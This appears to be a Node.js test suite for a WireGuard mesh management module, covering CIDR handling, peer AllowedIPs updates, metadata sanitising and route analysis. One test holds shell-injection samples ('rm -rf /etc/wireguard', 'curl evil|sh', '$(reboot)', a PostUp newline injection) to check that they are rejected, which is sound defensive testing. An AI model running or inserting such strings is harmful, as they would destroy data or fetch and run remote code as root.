import assert from "node:assert/strict";
import { chmod, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import {
	_buildPeerUpdates,
	buildLinkRecord,
	canonicalizeIpv4Network,
	buildRouteAnalysis,
	buildTopology,
	classifyLinkType,
	enrichInterfaceStatus,
	enrichLinkRecord,
	normalizeInterfaceRole,
	normalizeLinkType,
	sanitizeInterfaceMetadata,
	sanitizeLinkMetadata,
} from "./wireguard.js";

// ─── canonicalizeIpv4Network (host-bits masking + IPv6 rejection) ────────────

test("canonicalizeIpv4Network masks host bits and rejects IPv6 / out-of-range / no-prefix", () => {
	assert.equal(canonicalizeIpv4Network("192.168.10.1/24"), "192.168.10.0/24");
	assert.equal(canonicalizeIpv4Network("10.5.5.5/8"), "10.0.0.0/8");
	assert.equal(canonicalizeIpv4Network("192.168.10.0/24"), "192.168.10.0/24");
	assert.equal(canonicalizeIpv4Network(" 172.16.4.9/12 "), "172.16.0.0/12");
	assert.equal(canonicalizeIpv4Network("fd00:50::/64"), null, "IPv6 rejected — mesh routes IPv4 site nets only");
	assert.equal(canonicalizeIpv4Network("999.0.0.0/8"), null, "out-of-range octet");
	assert.equal(canonicalizeIpv4Network("10.0.0.0/33"), null, "bad prefix");
	assert.equal(canonicalizeIpv4Network("10.0.0.0"), null, "missing prefix");
});

// ─── _buildPeerUpdates (hub-side AllowedIPs recompute) ───────────────────────

// Regression (Fix #5): an untyped single-subnet site link must NOT be degraded to
// "client" by the ≤1-route heuristic — that would strip its LAN from the hub peer
// while agent-side _collectSiteNetworks keeps advertising it (split-brain).
test("_buildPeerUpdates keeps an untyped single-subnet link as a site (no strip)", () => {
	const peerMap = new Map([["PK1", ["10.10.0.6/32", "192.168.60.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", importedNetworks: ["192.168.60.0/24"] } }; // no type
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.ok(!updates.has("PK1"), "untyped site must keep its subnet (no update)");
});

test("_buildPeerUpdates strips an EXPLICIT client to host routes only", () => {
	const peerMap = new Map([["PK1", ["10.10.0.6/32", "192.168.60.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "client", importedNetworks: ["192.168.60.0/24"] } };
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.deepEqual(updates.get("PK1"), ["10.10.0.6/32"]);
});

// Regression (Fix #4): emptying importedNetworks to [] must DROP the subnet hub-side
// (authoritative), not fall back to the conf's current CIDRs and re-inject it.
test("_buildPeerUpdates drops the subnet when importedNetworks is explicitly empty", () => {
	const peerMap = new Map([["PK1", ["10.10.0.5/32", "192.168.50.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "site-to-site", importedNetworks: [] } };
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.deepEqual(updates.get("PK1"), ["10.10.0.5/32"]);
});

test("_buildPeerUpdates preserves conf CIDRs when metadata has NO importedNetworks key", () => {
	const peerMap = new Map([["PK1", ["10.10.0.5/32", "192.168.50.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "site-to-site" } }; // legacy/unmanaged
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.ok(!updates.has("PK1"), "absent key = legacy → preserve existing non-host CIDRs");
});

async function withWireGuardEnv(env, suffix, fn) {
	const previous = {
		WG_CONF_DIR: process.env.WG_CONF_DIR,
		WG_BIN: process.env.WG_BIN,
		IP_BIN: process.env.IP_BIN,
		WG_METADATA_FILE: process.env.WG_METADATA_FILE,
	};

	Object.assign(process.env, env);

	try {
		const imported = await import(`./wireguard.js?case=${suffix}`);
		return await fn(imported);
	} finally {
		for (const [key, value] of Object.entries(previous)) {
			if (value === undefined) {
				delete process.env[key];
			} else {
				process.env[key] = value;
			}
		}
	}
}

test("normalize and sanitize metadata keep the canonical wireguard vocabulary", () => {
	assert.equal(normalizeLinkType("site-link"), "site-to-site");
	assert.equal(normalizeInterfaceRole("site-link"), "site-to-site");

	assert.deepEqual(
		sanitizeLinkMetadata({
			type: "site-link",
			exportedNetworks: ["10.0.0.0/24", "10.0.0.0/24", "", null],
			importedNetworks: ["192.168.50.0/24"],
			returnPathMode: "static-route",
			remoteManagementMode: "ssh",
			planIntent: "site-to-site",
			planState: "validate",
			notes: ["review", "review", ""],
		}),
		{
			name: undefined,
			type: "site-to-site",
			exportedNetworks: ["10.0.0.0/24"],
			importedNetworks: ["192.168.50.0/24"],
			returnPathMode: "static-route",
			remoteManagementMode: "ssh",
			planIntent: "site-to-site",
			planState: "validate",
			notes: ["review"],
		},
	);

	assert.deepEqual(
		sanitizeInterfaceMetadata({
			role: "site-link",
			managementMode: "imported",
			exportedNetworks: ["10.10.0.0/24", "10.10.0.0/24"],
			importedNetworks: ["192.168.60.0/24"],
			routeTargets: ["192.168.60.0/24", ""],
			notes: ["needs review", "needs review"],
		}),
		{
			role: "site-to-site",
			managementMode: "imported",
			exportedNetworks: ["10.10.0.0/24"],
			importedNetworks: ["192.168.60.0/24"],
			routeTargets: ["192.168.60.0/24"],
			notes: ["needs review"],
		},
	);
});

test("network metadata rejects shell-injection and malformed CIDR values", () => {
	// Network fields flow into `ip route add <net>` PostUp shell strings executed
	// as root, so anything that isn't a clean IPv4 CIDR is dropped (IPv6 site nets
	// are out of scope) and host bits are masked to the network address.
	const link = sanitizeLinkMetadata({
		type: "site-to-site",
		exportedNetworks: [
			"10.0.0.0/24", // valid — kept
			"10.0.0.0/24; rm -rf /etc/wireguard", // injection — dropped
			"10.0.0.0/24 || curl evil|sh", // injection — dropped
			"$(reboot)", // injection — dropped
			"`id`", // injection — dropped
			"-x", // flag injection — dropped
			"999.1.1.1/24", // octet > 255 — dropped
			"fd00::/64", // IPv6 — dropped (mesh routes IPv4 site networks only)
			"10.0.0.5/24", // host bits set — canonicalized to 10.0.0.0/24 (deduped)
		],
		importedNetworks: ["192.168.50.0/24", "not a cidr"],
	});
	assert.deepEqual(link.exportedNetworks, ["10.0.0.0/24"]);
	assert.deepEqual(link.importedNetworks, ["192.168.50.0/24"]);

	const iface = sanitizeInterfaceMetadata({
		exportedNetworks: ["10.10.0.0/24", "10.10.0.0/24\nPostUp = id"],
		importedNetworks: ["192.168.60.0/24"],
		routeTargets: ["192.168.60.0/24", "; touch /tmp/pwned"],
	});
	assert.deepEqual(iface.exportedNetworks, ["10.10.0.0/24"]);
	assert.deepEqual(iface.routeTargets, ["192.168.60.0/24"]);
});

test("classifyLinkType keeps single-network wg0 peers in the client bucket", () => {
	assert.equal(classifyLinkType(["192.168.50.0/24"], "wg0"), "client");
	assert.equal(classifyLinkType(["192.168.50.10/32"], "wg0"), "client");
	assert.equal(classifyLinkType(["192.168.50.0/24", "192.168.60.0/24"], "wg0"), "hub-link");
	assert.equal(classifyLinkType(["192.168.200.0/24"], "wg1"), "site-to-site");
});

test("buildRouteAnalysis excludes imported networks already covered by static private routes", () => {
	const topology = buildTopology(
		[
			{
				exportedNetworks: ["10.10.0.0/24"],
				importedNetworks: ["192.168.50.0/24", "192.168.60.0/24"],
			},
		],
		[],
	);

	const routeAnalysis = buildRouteAnalysis(
		{
			all: [
				{
					destination: "192.168.50.0/24",
					device: "eth0",
					via: "10.0.0.1",
					raw: "192.168.50.0/24 via 10.0.0.1 dev eth0",
				},
				{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" },
			],
			wireguard: [{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" }],
			privateRoutes: [
				{
					destination: "192.168.50.0/24",
					device: "eth0",
					via: "10.0.0.1",
					raw: "192.168.50.0/24 via 10.0.0.1 dev eth0",
				},
				{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" },
			],
		},
		topology,
	);

	assert.deepEqual(routeAnalysis.missingReturnRoutes, [
		{ network: "192.168.60.0/24", reason: "network-not-found-in-live-routes" },
	]);
	assert.deepEqual(routeAnalysis.natCandidates, [{ network: "192.168.60.0/24", reason: "return-path-unclear" }]);
	assert.equal(routeAnalysis.staticRoutes.length, 1);
	assert.match(routeAnalysis.observations.join(" "), /Static private routes exist outside WireGuard/);
});

test("enrichLinkRecord derives warnings, next actions and plan state from route gaps", () => {
	const rawLink = buildLinkRecord(
		"wg1",
		{
			publicKey: "site-peer-key",
			endpoint: null,
			allowedIps: ["192.168.200.0/24"],
			latestHandshake: 0,
			rxBytes: 1,
			txBytes: 2,
			isActive: false,
		},
		0,
		{
			type: "site-link",
			importedNetworks: ["192.168.200.0/24"],
			exportedNetworks: [],
			returnPathMode: "unknown",
			remoteManagementMode: "unknown",
			planIntent: "site-to-site",
		},
	);

	const routeAnalysis = {
		missingReturnRoutes: [{ network: "192.168.200.0/24", reason: "network-not-found-in-live-routes" }],
		natCandidates: [{ network: "192.168.200.0/24", reason: "return-path-unclear" }],
	};

	const link = enrichLinkRecord(rawLink, routeAnalysis);

	assert.equal(link.type, "site-to-site");
	assert.equal(link.planState, "discover");
	assert.deepEqual(
		link.warnings.sort(),
		[
			"exported-networks-missing",
			"imported-network-missing-live-route",
			"link-not-currently-active",
			"nat-likely-needed",
			"remote-endpoint-missing",
			"remote-management-mode-undefined",
			"return-path-mode-undefined",
		].sort(),
	);
	assert.deepEqual(
		link.nextActions.sort(),
		[
			"decide-nat-or-static-route",
			"define-remote-management-mode",
			"define-return-path-mode",
			"fix-return-path",
			"model-exported-networks",
			"verify-live-tunnel-state",
			"verify-return-path",
		].sort(),
	);
});

test("enrichInterfaceStatus marks inactive interfaces with risky links as warning", () => {
	const enriched = enrichInterfaceStatus(
		{
			name: "wg1",
			active: false,
			configExists: true,
			privateKeyPresent: true,
			peerCount: 1,
			importedNetworks: ["192.168.200.0/24"],
			notes: [],
		},
		[
			{
				interfaceName: "wg1",
				warnings: ["return-path-mode-undefined"],
			},
		],
	);

	assert.equal(enriched.health, "warning");
	assert.deepEqual(
		enriched.notes.sort(),
		["1 link(s) on this interface need review", "inactive interface with imported networks"].sort(),
	);
});

test("getStatus composes runtime, metadata and route analysis into one status object", async () => {
	const tempRoot = await mkdtemp(path.join(os.tmpdir(), "wg-status-test-"));
	const confDir = path.join(tempRoot, "conf");
	const binDir = path.join(tempRoot, "bin");
	const metadataFile = path.join(tempRoot, "wireguard-metadata.json");
	await mkdir(confDir, { recursive: true });
	await mkdir(binDir, { recursive: true });

	await writeFile(
		path.join(confDir, "wg0.conf"),
		`[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = local-private-key

[Peer]
AllowedIPs = 192.168.50.0/24
`,
		"utf8",
	);

	await writeFile(
		path.join(confDir, "wg1.conf"),
		`[Interface]
Address = 10.1.0.1/24
ListenPort = 51821
PrivateKey = remote-private-key

[Peer]
AllowedIPs = 192.168.200.0/24
`,
		"utf8",
	);

	await writeFile(
		metadataFile,
		`${JSON.stringify(
			{
				interfaces: {
					wg1: {
						role: "site-link",
						managementMode: "imported",
						exportedNetworks: ["10.20.0.0/24"],
						importedNetworks: ["192.168.200.0/24"],
						routeTargets: ["192.168.200.0/24"],
						notes: ["field note"],
					},
				},
				links: {
					"wg1:site-peer-key": {
						type: "site-link",
						name: "site-a",
						exportedNetworks: ["10.20.0.0/24"],
						importedNetworks: ["192.168.200.0/24"],
						returnPathMode: "static-route",
						remoteManagementMode: "ssh",
						planIntent: "site-to-site",
						planState: "validate",
						notes: ["planned link"],
					},
				},
			},
			null,
			2,
		)}\n`,
		"utf8",
	);

	const wgBin = path.join(binDir, "wg-test");
	await writeFile(
		wgBin,
		`#!/usr/bin/env bash
printf 'wg0\\tprivate0\\thub-public-key\\t51820\\toff\\n'
printf 'wg0\\tpeer-public-key\\t(psk)\\tpeer.example.com:51820\\t192.168.50.0/24\\t4102444800\\t10\\t20\\t0\\n'
printf 'wg1\\tprivate1\\tsite-public-key\\t51821\\toff\\n'
printf 'wg1\\tsite-peer-key\\t(psk)\\t\\t192.168.200.0/24\\t0\\t1\\t2\\t0\\n'
`,
		"utf8",
	);
	await chmod(wgBin, 0o755);

	const ipBin = path.join(binDir, "ip-test");
	await writeFile(
		ipBin,
		`#!/usr/bin/env bash
if [ "$1" = "route" ] && [ "$2" = "show" ]; then
	printf '10.0.0.0/24 dev wg0\\n'
	printf '192.168.50.0/24 dev wg0\\n'
	printf '10.20.0.0/24 dev wg1\\n'
fi
`,
		"utf8",
	);
	await chmod(ipBin, 0o755);

	try {
		await withWireGuardEnv(
			{
				WG_CONF_DIR: confDir,
				WG_BIN: wgBin,
				IP_BIN: ipBin,
				WG_METADATA_FILE: metadataFile,
			},
			Date.now(),
			async (imported) => {
				const status = await imported.default.getStatus();

				assert.equal(status.available, true);
				assert.equal(status.mode, "metadata-write");
				assert.equal(status.summary.interfaceCount, 2);
				assert.equal(status.summary.linkCount, 2);
				assert.equal(status.hub?.name, "wg0");
				assert.equal(status.capabilities.supports.metadataCrud, true);
				assert.deepEqual(status.topology.siteLinks, ["wg1:site-peer-key"]);
				assert.deepEqual(status.topology.clientLinks, ["wg0:peer-public-key"]);
				assert.deepEqual(status.routes.missingReturnRoutes, [
					{ network: "192.168.200.0/24", reason: "network-not-found-in-live-routes" },
				]);

				const siteInterface = status.interfaces.find((item) => item.name === "wg1");
				assert.equal(siteInterface?.role, "site-to-site");
				assert.equal(siteInterface?.managementMode, "imported");
				assert.equal(siteInterface?.health, "warning");
				assert.match((siteInterface?.notes || []).join(" "), /field note/);

				const siteLink = status.links.find((item) => item.id === "wg1:site-peer-key");
				assert.equal(siteLink?.type, "site-to-site");
				assert.equal(siteLink?.name, "site-a");
				assert.equal(siteLink?.planState, "validate");
				assert.equal(siteLink?.remoteManagementMode, "ssh");
				assert.equal(siteLink?.returnPathMode, "static-route");
				assert.match((siteLink?.warnings || []).join(" "), /imported-network-missing-live-route/);
				assert.equal(status.warnings.includes("Interface wg1 needs review"), true);
				assert.equal(status.nextActions.includes("fix-return-path"), true);
			},
		);
	} finally {
		await rm(tempRoot, { recursive: true, force: true });
	}
});
